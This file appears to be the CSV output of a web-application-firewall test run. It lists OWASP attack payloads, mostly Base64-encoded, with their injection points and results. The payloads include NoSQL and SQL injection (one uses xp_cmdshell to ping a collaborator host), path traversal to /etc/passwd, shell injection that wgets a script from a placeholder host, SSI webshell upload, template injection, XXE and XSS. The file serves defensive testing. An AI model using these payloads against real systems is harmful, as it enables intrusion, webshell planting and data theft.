Payload,Check Status,Response Code,Placeholder,Encoder,Set,Case,Test Result
%27%2C%20$or:%20%5B%20%7B%7D%2C%20%7B%20%27order%27:%27order,passed,200,URLPath,URL,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
JywgJG9yOiBbIHt9LCB7ICdvcmRlcic6J29yZGVy,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,URLPath,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,URLParam,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
O3ZhciBkYXRlID0gbmV3IERhdGUoKTsgZG97Y3VyRGF0ZSA9IG5ldyBEYXRlKCk7fXdoaWxlKGN1ckRhdGUtZGF0ZQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,JSONRequest,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,nosql-injection,failed
MDt2YXIgZGF0ZT1uZXcgRGF0ZSgpOyBkb3tjdXJEYXRlID0gbmV3IERhdGUoKTt9d2hpbGUoY3VyRGF0ZS1kYXRlPDEwMDAwKQ,passed,200,HTMLForm,Base64Flat,owasp,nosql-injection,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,URLPath,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,URLParam,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,HTMLMultipartForm,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,JSONRequest,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,HTMLForm,Base64Flat,owasp,path-traversal,failed
L3N0YXRpYy9pbWcvLi4vLi4vZXRjL3Bhc3N3ZA,passed,200,HTMLMultipartForm,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,URLParam,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,URLPath,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,HTMLForm,Base64Flat,owasp,path-traversal,failed
XFw6OjFcYyRcdXNlcnNcZGVmYXVsdFxudHVzZXIuZGF0,passed,200,JSONRequest,Base64Flat,owasp,path-traversal,failed
ax--exec=%60id%60--remote=origin,passed,200,URLPath,URL,owasp,rce-urlpath,failed
cmd=127.0.0.1 && ls /etc,passed,200,Header,Plain,owasp,rce,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
O3dnZXQgaHR0cDovL3NvbWVfaG9zdC9zaDMxMS5zaA,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
O2dldGVudCRJRlMkOWhvc3RzJElGUyQ5c29tZWhvc3QuYnVycGNvbGxhYm9yYXRvci5uZXQ7ZWNobyRJRlMkOSQoKDM0ODIqNzMwMSkpOw,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,HTMLForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,HTMLMultipartForm,Base64Flat,owasp,shell-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,URLParam,Base64Flat,owasp,shell-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
fCBzZXQgL2EgMzQ4Mio3MzAx,passed,200,JSONRequest,Base64Flat,owasp,shell-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,Header,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
KHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikvKicrKHNlbGVjdCgwKWZyb20oc2VsZWN0KHNsZWVwKDE1KSkpdikrJyUyMisoc2VsZWN0KDApZnJvbShzZWxlY3Qoc2xlZXAoMTUpKSl2KSslMjIqLw,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,Header,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
MzsvKiBhICovIERFQ0xBUkUgQGMgdmFyY2hhcigyNTUpOy8qIGIgKi9TRUxFQ1QgQGM9J3BpbmcgJyttYXN0ZXIuc3lzLmZuX3ZhcmJpbnRvaGV4c3RyKGNvbnZlcnQodmFyYmluYXJ5LFNZU1RFTV9VU0VSKSkrJy4wMDAuYnVycGNvbCcrJ2xhYm9yYXRvci5uZXQnOy8qeHgqLyBFWEVDIE1hc3Rlci5kYm8ueHBfY21kc2hlbGwgQGM7Lyp4eHgqLyBFWEVDIHNwX1NZU19Qcm90b09wIEBpZD0z,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,Header,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
LTExMzQnKSAgT1IgSlNPTl9FWFRSQUNUKCd7JydhS0VSJyc6IDk2NDh9JywgJyQuYUtFUicpID0gOTY0OCo3Nzk5IEFORCAoJ1FsWWEnIExJS0UgJ1FsWWE,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,Header,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,URLParam,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,URLPath,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,JSONRequest,Base64Flat,owasp,sql-injection,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,HTMLForm,Base64Flat,owasp,sql-injection,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
MTIzKSBBTkQgMTI9MTIgIEFORCBKU09OX0RFUFRIKCd7fScpICE9IDI1MjE,passed,200,HTMLMultipartForm,Base64Flat,owasp,sql-injection,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0id2dldCBodHRwOi8vc29tZV9ob3N0L3NoZWxsLnR4dCB8IHJlbmFtZSBzaGVsbC50eHQgc2hlbGwucGhwIi0tPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,URLParam,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0ibHMiIC0tPg,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,HTMLMultipartForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,HTMLForm,Base64Flat,owasp,ss-include,failed
PCEtLSNleGVjIGNtZD0iZGlyIiAtLT4,passed,200,URLPath,Base64Flat,owasp,ss-include,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
PCNhc3NpZ24gZXggPSAiZnJlZW1hcmtlci50ZW1wbGF0ZS51dGlsaXR5LkV4ZWN1dGUiP25ldygpPiR7IGV4KCJpZCIpfQ,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,URLPath,Base64Flat,owasp,sst-injection,failed
YWFhYVx1MDAyNyUyYiN7MTYqODc4N30lMmJcdTAwMjdiYmI,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,HTMLForm,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE x SYSTEM ""//x/x"" > <x>a</x>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,URLParam,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""expect://id"">]><foo>&xxe;</foo>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
"<!DOCTYPE x [ <!ENTITY % y SYSTEM ""//y/y"" > %y; ]><x>a</x>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
e3sxMzM3KjEzMzh9fQ,passed,200,HTMLMultipartForm,Base64Flat,owasp,sst-injection,failed
"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/text.txt"" > ] > <foo>&xxe;</foo>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><x xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xsi:schemaLocation=""http://xxe-xsi-schemalocation.yourdomain[.]com/""/>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,HTMLForm,Base64Flat,owasp,xss-scripting,failed
"<?xml version=""1.0"" encoding=""utf-8"" standalone=""no"" ?><xs:schema xmlns:xs=""http://www.w3.org/2001/XMLSchema""><xs:include namespace=""http://xxe-xsinclude-namespace.yourdomain[.]com/""/></xs:schema>",passed,200,XMLBody,Plain,owasp,xml-injection,failed
PGJvZHkgb25sb2FkPWFsZXJ0KCd0ZXN0MScpPg,passed,200,URLParam,Base64Flat,owasp,xss-scripting,failed
